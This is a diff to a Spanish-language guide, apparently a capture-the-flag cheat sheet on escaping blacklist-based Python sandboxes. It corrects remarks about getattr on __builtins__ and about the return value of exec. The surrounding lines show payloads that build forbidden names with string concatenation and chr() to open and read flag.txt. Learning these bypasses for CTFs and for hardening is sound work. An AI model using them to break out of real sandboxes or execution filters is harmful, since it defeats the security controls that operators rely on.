@@ -32,7 +32,7 @@ Variantes: `blacklist.__init__()`, `blacklist.pop()` repetido, o reasignar con `
 
 ## 3. Construir nombres prohibidos
 
-Con `getattr` y concatenación se evita la subcadena literal:
+Con `getattr` y concatenación se evita la subcadena literal (si `__builtins__` es el módulo, no un diccionario):
 
 ```python
 getattr(__builtins__, "op" + "en")("flag.txt").read()
@@ -44,7 +44,7 @@ Con `chr` se construyen cadenas sin comillas ni letras prohibidas:
 print(open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read())
 ```
 
-Si `print` está bloqueado, usar `sys.stdout.write` o el valor de retorno de `exec` con `compile`.
+Si `print` está bloqueado, usar `sys.stdout.write` o `eval(compile(...))`; `exec` siempre devuelve `None`.
 
 ## 4. Llegar a los builtins
 
